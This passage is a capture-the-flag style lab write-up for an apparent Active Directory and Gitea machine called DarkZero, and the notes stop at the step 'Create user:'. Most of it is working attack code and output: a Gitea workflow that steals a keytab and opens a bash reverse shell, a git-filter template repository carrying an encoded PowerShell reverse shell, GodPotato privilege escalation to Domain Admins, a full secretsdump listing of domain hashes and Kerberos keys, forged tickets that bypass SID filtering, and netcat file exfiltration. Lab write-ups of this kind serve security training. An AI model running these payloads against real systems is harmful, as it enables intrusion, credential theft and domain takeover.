
- I then edit the `main.yml` workflow to fit in my payload:
```
name: Host Maintenance
on: [pull_request_review, pull_request_review_comment]
 
jobs:
  maintenance:
    runs-on: ubuntu
    steps:
      - name: maintain
        shell: bash
        run: |
          set +e
          cp /etc/gitea-runner/svc-runner.keytab /tmp/svc-runner.keytab
          cp /tmp/krb5cc_gitea /tmp/svc-runner.ccache
          chmod 644 /tmp/svc-runner.keytab /tmp/svc-runner.ccache
          bash -c 'bash -i >& /dev/tcp/<MY-IP>/9001 0>&1'
          exit 0
```

- I then pull the repo to be merged into the main repo:

![[Pasted image 20260806075603.png]]

- I navigate to File Changes tab and leave a comment and review comment on it to trigger the payload and grab a shell on my lsitener:
![[Pasted image 20260806075810.png]]
- There is a `+` sign on each line to leave a coment and then on the top right there is a Review button where we can leave a comment to finally trigger the payload

- I get a shell on my lsitener as `svc-runner`:
![[Pasted image 20260731110011.png]]


### Unintended route to DC02 (Bottom of notes for intended)
- However this is the same target.

- Looking online I see another template vulnerability for gitea bys earching in google `gitea 1.25.0 vulnerability template` to find CVE-2026-25718 which is a path traversal vulnerability ` improperly resolve paths when generating a template repository, allowing a path traversal through symlinks or other non‑regular paths (CWE‑59). This flaw enables an attacker to overwrite files, potentially compromising configuration files, sensitive data, and providing a foothold for further compromise.`
- This alongside a Windows path normalization legacy feature helps us gain RCE.
	- On Windows, the file system APIs (e.g., CreateFile) remove trailing dots and spaces from path components during name resolution. This is a legacy compatibility feature.
		- A file or directory named .git. is treated as .git.
		- A path like ./.git. resolves to ./.git. 
- First we create the payload and convert it to base64 (or use the b64 encoded powershell command from revshells website):
```
read -r -d '' PS_RAW << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF


PS_RAW=${PS_RAW//ATTACKER_IP/10.10.16.41}     # Change to your IP
PS_RAW=${PS_RAW//PORT/9999}                   # Change to your port

# Encode to UTF-16LE and Base64
B64_PAYLOAD=$(echo -n "$PS_RAW" | iconv -t UTF-16LE | base64 -w0)
echo "Base64 Payload: $B64_PAYLOAD"

export B64="$B64_PAYLOAD"

---OR---
# Copy b64 encoded command from revshells website

B64_PAYLOAD=JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMQA4ADQAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

export B64="$B64_PAYLOAD"
```

![[Pasted image 20260803100041.png]]

![[Pasted image 20260806060038.png]]

- We then create the amlicious repository with the payload in it:
```
# Create working directory
mkdir -p /tmp/pwn_repo && cd /tmp/pwn_repo

# 1. .gitattributes - maps 'trigger' file to the 'pwn' filter
echo "trigger filter=pwn" > .gitattributes

# 2. trigger - dummy file that will be processed by git add
echo "dummy_content" > trigger

# 3. .gitea/template - ensures all files are included in the template
mkdir -p .gitea
echo "**" > .gitea/template

# 4. ${REPO_DESCRIPTION}/config - the planted git config
#    The directory name is a literal string that Gitea will expand.
mkdir -p '${REPO_DESCRIPTION}'
cat > '${REPO_DESCRIPTION}/config' << EOF
[filter "pwn"]
    clean = powershell.exe -NoProfile -NonInteractive -EncodedCommand ${B64}
    smudge = cat
    required = true
EOF
```

- To verify:
```
find . -type f

---OUTPUT---
# Expected output:
# ./.gitattributes
# ./.gitea/template
# ./${REPO_DESCRIPTION}/config
# ./trigger
```

- With josh's credentials `/tmp/krb5cc_josh` we push the template to gitea
```
faketime '+7 hours' proxychains4 -q git init
faketime '+7 hours' proxychains4 -q git add .
faketime '+7 hours' proxychains4 -q git commit -m "green_bosy_until_death"
faketime '+7 hours' proxychains4 -q git remote add origin http://gitea.darkzero.ext:3000/darkzero-ext_josh/pwn_template.git
```

- We create the repository:
```
faketime '+7 hours' proxychains4 -q curl -X POST --negotiate -u : -H "Content-Type: application/json" -d '{"name":"pwn_template","private":false,"auto_init":false,"description":"template repo"}' "http://gitea.darkzero.ext:3000/api/v1/user/repos" | python3 -m json.tool
```

- Then we push it to the repository
```
# then push 
faketime '+7 hours' proxychains4 -q git push -u origin master
```
- We set it to be a template:
```
faketime '+7 hours' proxychains4 -q curl -X PATCH \
  --negotiate -u : \
  -H "Content-Type: application/json" \
  -d '{"template": true}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/pwn_template"
```
![[Pasted image 20260806055754.png]]
- Finally we trigger the exploit with our listener running:
```
faketime '+7 hours' proxychains4 -q curl -X POST --negotiate -u : \
  -H "Content-Type: application/json" \
  -d '{"owner":"darkzero-ext_josh","name":"triggered_repo","description":".git.","private":false,"git_content":true}' \
  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/pwn_template/generate"
```


- We grab a shell on our listener on DC02 windows:
![[Pasted image 20260803100636.png]]

- Checking privileges we see this user has `SeImpersonatePrivilege` enabled. However grabbing a shell as nt-authority/system doesnt seem to work.
```
.\gp.exe -cmd "C:\windows\system32\cmd.exe /c whoami"

--_OUTPUT---
[*] CombaseModule: 0x140734113251328
[*] DispatchTable: 0x140734115984976
[*] UseProtseqFunction: 0x140734114956960
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\df4c118a-a8a5-4fe2-b049-f3b34d5c3298\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005c02-014c-ffff-f410-bc71de844744
[*] DCOM obj OXID: 0xf3a3dba077d5616c
[*] DCOM obj OID: 0xdf41d94192081b56
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 644 Token:0x740  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3936


---FAILED-SHELL-COMMAND---
.\gp.exe -cmd "C:\windows\system32\cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANAAxACIALAA5ADkAOQA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
[*] CombaseModule: 0x140734113251328
[*] DispatchTable: 0x140734115984976
[*] UseProtseqFunction: 0x140734114956960
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\6f0a9548-ae0d-4f69-b123-7155b170c064\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00004402-0a08-ffff-917a-1f15b6c04366
[*] DCOM obj OXID: 0xd4635c060001793d
[*] DCOM obj OID: 0xc434ed5d45057d39
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 644 Token:0x740  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[!] Cannot create process Win32Error:-2147024809
```
- Instead since we have a known user, we can add this user to Domain Admins and then login the DC02 with this user (`josh`:`Rangers1`)
- First we create a file with the command in it:
```
Set-Content -Encoding ASCII C:\Windows\Temp\grenois.cmd 'net group "Domain Admins" josh /add /domain'
```
- Then we execute it with GodPotato:
```
.\gp.exe  -cmd "cmd.exe /c C:\Windows\Temp\grenois.cmd"
[*] CombaseModule: 0x140734113251328
[*] DispatchTable: 0x140734115984976
[*] UseProtseqFunction: 0x140734114956960
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\9568676e-473e-4573-b540-ad3b86a11b03\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00006402-01bc-ffff-3c7d-ed0b0ca0e512
[*] DCOM obj OXID: 0xd7e7133147ed802a
[*] DCOM obj OID: 0x716a67c340f7803f
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 644 Token:0x740  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1032

C:\Windows\System32>net group "Domain Admins" josh /add /domain 
The command completed successfully.


```

- We then verify we can access DC02 as `josh`:
```
proxychains4 -q nxc smb 172.16.20.2 -u josh -p 'Rangers1' -d darkzero.ext
SMB         172.16.20.2     445    DC02             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.2     445    DC02             [+] darkzero.ext\josh:Rangers1 (Pwn3d!)

```
![[Pasted image 20260803101443.png]]

- Finally using josh's creds we can dump all credentials:
```
proxychains4 -q impacket-secretsdump darkzero.ext/josh:'Rangers1'@172.16.20.2 -just-dc
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a2bdd03aa4dc9ff2c4f19860e380618:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8beaf5f950fefe79f608390a806d29a7:::
darkzero.ext\david:1104:aad3b435b51404eeaad3b435b51404ee:57652eef49f116d28846990ccddb7b47:::
darkzero.ext\william:1105:aad3b435b51404eeaad3b435b51404ee:e9e4b9942000acabf654cbe83d4cf836:::
darkzero.ext\celia:1109:aad3b435b51404eeaad3b435b51404ee:ffd522a82693347e605dee2fa9beeb51:::
darkzero.ext\josh:1110:aad3b435b51404eeaad3b435b51404ee:cbacf36e107f69d4b76d2b3c4dc24a33:::
darkzero.ext\svc-gitea:1112:aad3b435b51404eeaad3b435b51404ee:f2ec6039e5a952c517742bcbfae633e5:::
darkzero.ext\svc-runner:1113:aad3b435b51404eeaad3b435b51404ee:8f02bbb99a9c1a57cb62c266b0c71ab0:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:297d0ed36ca7ca87dcde2b2c8412ba60:::
SRV01$:1108:aad3b435b51404eeaad3b435b51404ee:f6b89d7249b3621b43fa57a74f29116c:::
darkzero$:1103:aad3b435b51404eeaad3b435b51404ee:2df6a35394353e904db279359c14080b:::
[*] Kerberos keys grabbed
Administrator:0x14:3c4cb4af2ec77b5714f514c88d71d2c86bf1fe4e312521af9b578547fe633a5a
Administrator:0x13:4f183e4d16f14d6d889322414f7ebf94
Administrator:aes256-cts-hmac-sha1-96:357224179e090ac09df4cada21698695a395713fa1c5ac415a54b8b19c0f6966
Administrator:aes128-cts-hmac-sha1-96:cc3151ecd7fc10496b243108c7c53759
Administrator:0x17:6a2bdd03aa4dc9ff2c4f19860e380618
krbtgt:aes256-cts-hmac-sha1-96:8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
krbtgt:aes128-cts-hmac-sha1-96:ce9c97f5fd7021806190196f637e4b4e
krbtgt:0x17:8beaf5f950fefe79f608390a806d29a7
darkzero.ext\david:0x14:49e55245f4edf283986e661313b2700122db7c796646910e03c6c27cf324c49d
darkzero.ext\david:0x13:bb7a8f86f5e7023bfc148a1894fe9838
darkzero.ext\david:aes256-cts-hmac-sha1-96:1e3ca219582c60ab71c0688c7c3219a2ca0fc57d22efc1f273201321c8d30c27
darkzero.ext\david:aes128-cts-hmac-sha1-96:b99bc8413abf9dd1cbd6f063e55d95cc
darkzero.ext\david:0x17:57652eef49f116d28846990ccddb7b47
darkzero.ext\william:0x14:d19711ef82f2e9684d82b913c5adbc97ee7bc7bcdf03120cdcc12fa8012cf728
darkzero.ext\william:0x13:ec0b8db518471117f471f776395519a4
darkzero.ext\william:aes256-cts-hmac-sha1-96:fe28d0569987f531b226a59b65eeeec7082d71aae39202d436536f97ad2fc532
darkzero.ext\william:aes128-cts-hmac-sha1-96:4389a71eb4b5d3d384fde3b7f433950f
darkzero.ext\william:0x17:e9e4b9942000acabf654cbe83d4cf836
darkzero.ext\celia:0x14:17174882aba17a8f5e48d501d99619cd6b3c517222f262f5abf10086ef85ddbc
darkzero.ext\celia:0x13:c226461170f835b9b8b971fdd620be20
darkzero.ext\celia:aes256-cts-hmac-sha1-96:3e588846fef6d35301e68da09dca7345c6f84e3edb2b6a3af3408177eb71140b
darkzero.ext\celia:aes128-cts-hmac-sha1-96:a413bd83e14fd0de345ec7f13bd4adbd
darkzero.ext\celia:0x17:ffd522a82693347e605dee2fa9beeb51
darkzero.ext\josh:0x14:e9ba88a38aabb4adfdec4a8b782ac9fcb48d711f147b947c7b7718bd8e5a1fe1
darkzero.ext\josh:0x13:fb3a42bbbab110cfeb8556d5604a7556
darkzero.ext\josh:aes256-cts-hmac-sha1-96:086f140d39b9e5bb41f6dad9d76dc67695fe4a0f2f86a86406316734621826aa
darkzero.ext\josh:aes128-cts-hmac-sha1-96:800b542e6c54b855f8101159fbd3d21f
darkzero.ext\josh:0x17:cbacf36e107f69d4b76d2b3c4dc24a33
darkzero.ext\svc-gitea:0x14:3a77284ebb6ee755610b2f7fd70ec94a71282f79f1e93dd52e0c5b69ca4b4b26
darkzero.ext\svc-gitea:0x13:eae3b349ebd18ff5849506dd2d56c62b
darkzero.ext\svc-gitea:aes256-cts-hmac-sha1-96:4d27f8144b5c49434938c7734f1a522e141c30b39b3c96698cf82bdec818a722
darkzero.ext\svc-gitea:aes128-cts-hmac-sha1-96:e982268ea8bf041209f1ea093f31eb54
darkzero.ext\svc-gitea:0x17:f2ec6039e5a952c517742bcbfae633e5
darkzero.ext\svc-runner:0x14:309d9f4e7f6b1396d784c3f2703b63ab80713ddcb988b4de9fd9f8be092a327e
darkzero.ext\svc-runner:0x13:372e0455a30fc98119a36212ad06c6f2
darkzero.ext\svc-runner:aes256-cts-hmac-sha1-96:11e8fdf4a10b8f19751804b2a431a1fe6bf40c79fe26f3db5063aa2e4e4570b1
darkzero.ext\svc-runner:aes128-cts-hmac-sha1-96:c7930141eef79f5c7fd2917d99dcf9d6
darkzero.ext\svc-runner:0x17:8f02bbb99a9c1a57cb62c266b0c71ab0
DC02$:aes256-cts-hmac-sha1-96:d8cb694e2212d22714da90f476f85f2cbe62911affa83cbced7140df21a2461c
DC02$:aes128-cts-hmac-sha1-96:08addbe85bcedc597c61e413509bb858
DC02$:0x17:297d0ed36ca7ca87dcde2b2c8412ba60
SRV01$:0x14:e53a041706a728459af1c4bea37a5e6b280a0396c6901ebea3d7cd9c9f56e817
SRV01$:0x13:65618199caba9789214141c6b42053b6
SRV01$:aes256-cts-hmac-sha1-96:8ddd57e2b2b6b9231f5518e094eed8ec900309fd2259f2af343a3e9dbeeb714c
SRV01$:aes128-cts-hmac-sha1-96:65895714cf85fadae4e57f3594b20323
SRV01$:0x17:f6b89d7249b3621b43fa57a74f29116c
darkzero$:aes256-cts-hmac-sha1-96:ff0618a2d18360683b197232b262feae9a749325343e9ab68e22f681b4dc83a7
darkzero$:aes128-cts-hmac-sha1-96:000d1ff3b7b97163990b6623695946cd
[*] Cleaning up...
```

- Initially I try to then get the Administrator ccache but using that I still cant access C drive:
```
impacket-ticketer -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
                  -domain darkzero.ext \
                  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-519 \
                  -user-id 500 \
                  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
                  Administrator
                  

export KRB5CCNAME=$(pwd)/Administrator.ccache


faketime '+7 hours' proxychains4 -q nxc smb 172.16.20.2 -u Administrator -d darkzero.ext -k --use-kcache
# [+] darkzero.ext\Administrator from ccache (Pwn3d!)
```
![[Pasted image 20260803104354.png]]
- Then after checking bloodhound (both from target and using bloodhound-python) a path was identified. Basically we find that the trustvalue is 72 and when checking trusts there is a forest_transitive trust. THis implies SID less than 1000 is filtered but any SID > 1000 passes through unfiltered.
```
faketime '+7 hours' proxychains4 -q bloodyAD --host DC02.darkzero.ext -d DARKZERO.EXT -u josh -p 'Rangers1' get trusts

darkzero.ext
 +-- <FOREST_TRANSITIVE|AD>:darkzero.htb
```
![[Pasted image 20260803104236.png]]
- TO confirm SID filtering bypass:
```
Get-ADTrust -Server DC01.darkzero.htb -Filter * -Properties trustAttributes
# TrustAttributes         : 72
```
![[Pasted image 20260804112343.png]]
- I search for an SID >1000:
```
Get-ADGroup -Server DC01.darkzero.htb -Filter {AdminCount -eq 1 -and (objectSid -like '*')} -Properties Sid,Members | Where-Object { [int]($_.SID.Value.Split('-')[-1]) -ge 1000 } | Select-Object Name, SID

Name                         SID                                           
----                         ---                                           
InfrastructureAdministrators S-1-5-21-2899195410-1848524783-1547768515-1603
```
![[Pasted image 20260803104200.png]]

- Then I create an Administrator ccache and attach this extra SID to it:
```
faketime '+7 hours' impacket-ticketer \                                                               
  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -domain darkzero.ext -user-id 500 \
  -groups 513,512,520,518,519 \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
  Administrator
  
---OUTPUT---
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkzero.ext/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

```
faketime '+7 hours' proxychains4 -q kvno cifs/dc01.darkzero.htb@DARKZERO.HTB
cifs/dc01.darkzero.htb@DARKZERO.HTB: kvno = 4
```
![[Pasted image 20260803104133.png]]
- Finally I check the group membership of Infrastructure Administrators:
```
Get-ADGroup -Server DC01.darkzero.htb -Identity "InfrastructureAdministrators" -Properties MemberOf | Select-Object -ExpandProperty MemberOf | ForEach-Object { (Get-ADGroup -Server DC01.darkzero.htb -Identity $_).Name }

Backup Operators
```
![[Pasted image 20260803103947.png]]
- By default Backup Operators cant list file share with `ls` or `dir`

- To grab the flag we use the following script instead:
```
#!/usr/bin/env python3
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import (
    FILE_READ_DATA,
    FILE_READ_ATTRIBUTES,
    FILE_SHARE_READ,
    FILE_SHARE_WRITE,
    FILE_SHARE_DELETE,
    FILE_NON_DIRECTORY_FILE,
    FILE_OPEN_FOR_BACKUP_INTENT,
    FILE_OPEN,
    FILE_ATTRIBUTE_NORMAL,
)
import sys

host = sys.argv[1]
path = sys.argv[2]

smb = SMBConnection(host, "172.16.20.1")
smb.kerberosLogin(
    "Administrator",
    "",
    "DARKZERO.EXT",
    "",
    "",
    "",
    "172.16.20.1",
)

raw = smb._SMBConnection
tree_id = raw.connectTree("C$")

file_id = raw.create(
    tree_id,
    path,
    FILE_READ_DATA | FILE_READ_ATTRIBUTES,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    FILE_NON_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT,
    FILE_OPEN,
    FILE_ATTRIBUTE_NORMAL,
)

print(raw.read(tree_id, file_id, 0, 4096))
raw.close(tree_id, file_id)
```

- Or alternate script:
```
from impacket.smbconnection import SMBConnection
conn = SMBConnection('dc01.darkzero.htb', '172.16.20.1')
conn.kerberosLogin('Administrator', '', 'darkzero.ext', useCache=True)
tid = conn.connectTree('C$')
fid = conn.getSMBServer().create(
    tid, 'Users\\Administrator\\Desktop\\root.txt',
    FILE_READ_DATA, FILE_SHARE_READ,
    0x00004000,          # FILE_OPEN_FOR_BACKUP_INTENT
    FILE_OPEN, FILE_ATTRIBUTE_NORMAL
)
print(conn.getSMBServer().read(tid, fid, 0, 1024))
```


- Running the script with the Administrator ccache we eexported we can grab the root flag:
```
faketime '+7 hours' proxychains4 -q \
  python3 pe.py \    
  dc01.darkzero.htb 'Users\Administrator\Desktop\root.txt'
b'8941b32de390b625296531fae3e9d336\r\n'
```
![[Pasted image 20260803103911.png]]

### Intended path to DC02 and root in SRV01

- After the repository exploit giving us a shell on SRV01 as svc-runner the actual path to exploit is a legacy unix su authentication along with a forgotten OU.
- I find `krb5cc_gitea in `/tmp` folder and `svc-runner.keytab` in `/etc/gitea-runner` folder.
- I export it to my local machine:
```
---ON-TARGET---
nc 10.10.17.184 9999 < <filename>

---LOCALLY---
nc -lvnp 9999 > <filename>
```

- I renamed `krb5cc_gitea` to `svc-runner.ccache` 
- I then exported it and check AD permissions and groups related to it:
```
export KRB5CCNAME=svc-runner.ccache
proxychains4 bloodyAD --host dc02.darkzero.ext -d DARKZERO.EXT -k get object "svc-runner" --attr memberOf

---OUTPUT---
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc02.darkzero.ext:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DARKZERO.EXT:88  ...  OK
Clock skew detected. Adjusting local time by 6:59:58.832843. Retrying operation.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DARKZERO.EXT:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc02.darkzero.ext:88  ...  OK
Clock skew detected. Adjusting local time by 6:59:58.585886. Retrying operation.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc02.darkzero.ext:88  ...  OK

distinguishedName: CN=svc-runner,CN=Users,DC=darkzero,DC=ext
memberOf: CN=ServiceHandler,CN=Users,DC=darkzero,DC=ext
```

- I then check what this user has write permissions over:
```
proxychains4 bloodyAD --host dc02.darkzero.ext -d DARKZERO.EXT -k get writable

---OUTPUT---
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc02.darkzero.ext:389  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DARKZERO.EXT:88  ...  OK
Clock skew detected. Adjusting local time by 6:59:59.124561. Retrying operation.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DARKZERO.EXT:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc02.darkzero.ext:88  ...  OK
Clock skew detected. Adjusting local time by 6:59:58.984882. Retrying operation.
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc02.darkzero.ext:88  ...  OK

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: CN=svc-runner,CN=Users,DC=darkzero,DC=ext
permission: WRITE

distinguishedName: OU=GiteaMigration,DC=darkzero,DC=ext
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.darkzero.ext,CN=MicrosoftDNS,DC=ForestDnsZones,DC=darkzero,DC=ext
permission: CREATE_CHILD
```
![[Pasted image 20260805081007.png]]

- What immediately stands out is we have `CREATE_CHILD` permissions on the `GiteaMigration` OU.
	- so we can create any account in this OU, including user accounts.

- The exploit here is to create a user named root, which would then create a user named root in linux. We can then used kerberized su `ksu` to exploit this
	-  if ~root/.k5login and ~root/.k5users don't exist, ksu falls back to krb5_aname_to_localname() — the same mapping used generically to translate principal@REALM → local username. If that translation matches the requested local user, access is granted, with no ACL check at all.
- ***NOTE: this fallback only applies in interactive mode. `ksu root -e <cmd>` uses a stricter path that requires a .k5users entry for that specific command, which doesn't exist — so it fails. Use interactive mode with a heredoc instead***

- Create user:
```
